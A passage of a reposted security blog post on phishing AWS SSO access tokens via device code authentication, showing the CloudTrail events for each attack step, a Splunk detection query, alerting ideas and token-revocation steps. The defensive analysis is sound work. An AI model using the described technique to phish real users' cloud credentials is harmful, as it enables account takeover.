+<p>N/A</p>
+<p>Victim is shown the “_Sign-in with AWS CLI_” prompt</p>
+<p>sso:ListApplications</p>
+<p>Victim IP</p>
+<p>Victim submits the “_Sign-in with AWS CLI_” prompt</p>
+<p>None</p>
+<p>N/A</p>
+<p>Attacker retrieves the victim’s AWS SSO access token</p>
+<p>sso-oidc:CreateToken</p>
+<p>Attacker IP</p>
+<p>Attacker enumerates AWS accounts and roles of the victim</p>
+<p>sso:ListAccounts<br>sso:ListAccountRoles</p>
+<p>Attacker IP</p>
+<p><em>Note: While ‘CreateToken’ is part of the <a href="https://docs.aws.amazon.com/singlesignon/latest/OIDCAPIReference/API_CreateToken.html" target="_blank" rel="noopener">SSO OIDC</a> API, it is logged in CloudTrail with an eventSource of sso.amazonaws.com</em>.</p>
+<h3 id="Detection-strategies"><a href="#Detection-strategies" class="headerlink" title="Detection strategies"></a>Detection strategies</h3><p>A few leads for detection / pseudo-prevention below.</p>
+<p><strong>Block and alert on <em>device.sso.<region>.amazonaws.com</em> links on your e-mail gateway</strong></p>
+<p>The device authentication links are expected to be generated <em>locally</em>. A link to the domain <em>device.sso.<region>.amazonaws.com</em> in an e-mail should be considered as highly suspicious and investigated.  </p>
+<p><strong>Alert when different source IPs generate sso:ListApplications and sso-oidc:CreateToken events within a short time interval</strong></p>
+<p>Again, since device codes are expected to be used locally, having 2 distinct IP addresses display the “_Sign-in with AWS CLI prompt_” (victim) and generate an AWS SSO access token (attacker) is suspicious and should be a viable detection strategy. With Splunk and an interval size of 10 minutes:</p>
+<p>sourcetype=aws:cloudtrail eventSource=sso.amazonaws.com<br>| search eventName=ListApplications OR (eventName=CreateToken requestParameters.grantType=”urn:ietf:params:oauth:grant-type:device_code”)<br>| bucket _time span=10m<br>| stats<br>    values(sourceIPAddress) as sourceIps,<br>    values(userAgent) as userAgents,<br>    first(userIdentity.userName) as userNames,<br>    distinct_count(sourceIPAddress) as numIps<br>  by userIdentity.principalId, _time<br>| where numIps &gt;= 2<br>| table userNames, _time, sourceIps, userAgents</p>
+<p><em>(Note that we aggregate by principalId and not userName, because the user name is the victim’s e-mail in sso:ListApplications v.s. their display name in sso-oidc:CreateToken)</em></p>
+<p>For additional tuning, look into:</p>
+<ul>
+<li>Excluding trusted IP addresses from the CreateToken event search</li>
+<li>Adding filtering to only match cases with 2 distinct user agents</li>
+</ul>
+<p><strong>Alert when the volume of sso:ListAccountRoles events is unusually high for a specific user</strong></p>
+<p>A normal usage of AWS SSO (i.e. via the UI or CLI) seems to generate very few sso:ListAccountRoles events. A sudden increase in the number of these events indicates that someone is using a non-standard way to enumerate all the AWS SSO permissions of a specific user, and should be considered highly suspicious. The “normal” flow (e.g. from the AWS SSO <a href="https://docs.aws.amazon.com/singlesignon/latest/userguide/using-the-portal.html" target="_blank" rel="noopener">portal</a> web application) seems to make use of internal endpoints instead (<em>portal.sso.<region>.amazonaws.com/instance/appinstances</em>).</p>
+<h4 id="Alert-on-unusual-source-IPs-of-sso-oidc-CreateToken-events"><a href="#Alert-on-unusual-source-IPs-of-sso-oidc-CreateToken-events" class="headerlink" title="Alert on unusual source IPs of sso-oidc:CreateToken events"></a><strong>Alert on unusual source IPs of sso-oidc:CreateToken events</strong></h4><p>If your engineers authenticate to AWS exclusively from their corporate laptops located in an internal network, you can flag any external source IP used in the sso-oidc:CreateToken event. That can be an indicator of a successful device code phishing attempt, and the IP indicated will be the one used by the attacker.</p>
+<h3 id="Containment-–-revoking-AWS-SSO-access-tokens"><a href="#Containment-–-revoking-AWS-SSO-access-tokens" class="headerlink" title="Containment – revoking AWS SSO access tokens"></a>Containment – revoking AWS SSO access tokens</h3><p>We identified an employee who was phished using this technique – or any other, for that matter. How can we respond? The first step for containment is to invalidate the AWS SSO access token retrieved by the attacker.</p>
+<p>Unfortunately, without knowing the SSO access token value, <em>there is no documented way to revoke it.</em> Manually <strong>disabling an user in the AWS SSO identity directory does not immediately invalidate its access tokens</strong>. Same goes if you use a third-party IdP such as Okta; disabling a compromised user in Okta doesn’t help if an attacker already stole its AWS SSO access token. I reported this issue to the AWS security team, and they clarified the following:</p>
+<blockquote>
+<p><em>AWS SSO caches user attributes when they login to the user portal and refreshes them <strong>hourly</strong> to grant/revoke additional access. If you want to revoke all user access before any 1-hour period expires, you can do so by r<strong>emoving all assignments to the permission sets and accounts the user has access to.</strong></em></p>
+<p><em>We are already working towards an explicit session revocation feature for the SSO user portal.</em></p>
+</blockquote>
+<p>So while sub-optimal, there <em>is</em> a way to revoke immediately the access token of an AWS SSO use: remove them from any permission set assignment, whether direct or indirect (e.g. via a group).</p>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>One can argue that device code authentication is necessary to offer a nice user experience to engineers so they can work from the CLI using SSO. Which – arguably – remains much less risky than having dozens of unmanaged IAM users laying around. That said, it’s an important reminder that organizations should not see technical controls such as MFA as a silver bullet and continue investing time building security awareness for end users, and crafting high-value threat detection use-cases based on CloudTrail logs (but not only).</p>
+<p>Thank you for reading, and keep the conversation going on Twitter <a href="https://twitter.com/christophetd" target="_blank" rel="noopener">@ christophetd</a>!</p>
+<ul>
+<li>Have you ever seen this technique used in the wild?</li>
+<li>How valuable do you find the detection signals discussed in the post? How does it behave in your environment?</li>
+<li>For red teamers: Have you ever used this technique, whether for AWS or Azure?</li>
+</ul>
+<p>Thank you to my colleague Bogdan for introducing me to this technique for Azure AD; to Dusko Karaklajic of AWS, to the AWS SSO team, to the AWS security team, and to Scott Piper for their valuable input.</p>
+<p><em>Disclaimer: The AWS team requested that I was crystal clear – This is not a vulnerability in AWS SSO. It’s by design and is even called out in the <a href="https://datatracker.ietf.org/doc/html/rfc8628#section-5.4" target="_blank" rel="noopener">RFC</a>. Any IdP implementing OIDC device code authentication is vulnerable to such kinds of social engineering attacks. It’s even called out in the <a href="https://datatracker.ietf.org/doc/html/rfc8628#section-5.4" target="_blank" rel="noopener">RFC</a>. See for instance: <a href="https://o365blog.com/post/phishing/" target="_blank" rel="noopener">Introducing a new phishing technique for compromising Office 365 accounts</a></em>.</p>
+<p>Post Views: 2,111</p>
+<p>+1</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/fetched/" rel="tag"># fetched</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/06/11/qiwihui-pocket_readings-1128/" rel="prev" title="Cacao: Building macOS (and iOS) Apps in Rust | Ryan McGrath">
+      <i class="fa fa-chevron-left"></i> Cacao: Building macOS (and iOS) Apps in Rust | Ryan McGrath
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/06/13/qiwihui-pocket_readings-1130/" rel="next" title="
+
+
+复旦邱锡鹏组最新综述：A Survey of Transformers！ ">
+      
+
+
+复旦邱锡鹏组最新综述：A Survey of Transformers！  <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Comments"><span class="nav-number">1.</span> <span class="nav-text">Comments</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phishing-for-AWS-credentials-via-AWS-SSO-device-code-authentication-by-christophetd"><span class="nav-number"></span> <span class="nav-text">Phishing for AWS credentials via AWS SSO device code authentication by @christophetd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Background"><span class="nav-number"></span> <span class="nav-text">Background</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AWS-SSO"><span class="nav-number">1.</span> <span class="nav-text">AWS SSO</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Using-AWS-SSO-from-the-CLI"><span class="nav-number">2.</span> <span class="nav-text">Using AWS SSO from the CLI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#The-device-code-grant-type"><span class="nav-number">3.</span> <span class="nav-text">The device code grant type</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phishing-with-AWS-SSO-device-codes"><span class="nav-number"></span> <span class="nav-text">Phishing with AWS SSO device codes</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-0-Prerequisites"><span class="nav-number">1.</span> <span class="nav-text">Step 0: Prerequisites</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-1-Attacker-initiates-a-device-code-authorization-flow"><span class="nav-number">2.</span> <span class="nav-text">Step 1: Attacker initiates a device code authorization flow</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-2-Attacker-sends-the-device-authorization-URL-to-the-victim"><span class="nav-number">3.</span> <span class="nav-text">Step 2: Attacker sends the device authorization URL to the victim</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-3-Attacker-retrieves-an-SSO-access-token"><span class="nav-number">4.</span> <span class="nav-text">Step 3: Attacker retrieves an SSO access token</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-4-Attacker-uses-the-SSO-access-token-to-access-AWS-accounts"><span class="nav-number">5.</span> <span class="nav-text">Step 4: Attacker uses the SSO access token to access AWS accounts</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#What’s-a-blog-post-without-a-tool"><span class="nav-number">6.</span> <span class="nav-text">What’s a blog post without a tool?</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Detection-amp-prevention"><span class="nav-number"></span> <span class="nav-text">Detection &amp; prevention</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Prevention"><span class="nav-number">1.</span> <span class="nav-text">Prevention</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CloudTrail-events-at-each-step-of-the-attack"><span class="nav-number">2.</span> <span class="nav-text">CloudTrail events at each step of the attack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Detection-strategies"><span class="nav-number">3.</span> <span class="nav-text">Detection strategies</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Alert-on-unusual-source-IPs-of-sso-oidc-CreateToken-events"><span class="nav-number">3.1.</span> <span class="nav-text">Alert on unusual source IPs of sso-oidc:CreateToken events</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Containment-–-revoking-AWS-SSO-access-tokens"><span class="nav-number">4.</span> <span class="nav-text">Containment – revoking AWS SSO access tokens</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion"><span class="nav-number"></span> <span class="nav-text">Conclusion</span></a></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">qiwihui</p>
+  <div class="site-description" itemprop="description">个人阅读清单记录博客，并不代表个人观点。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">144</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">qiwihui</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
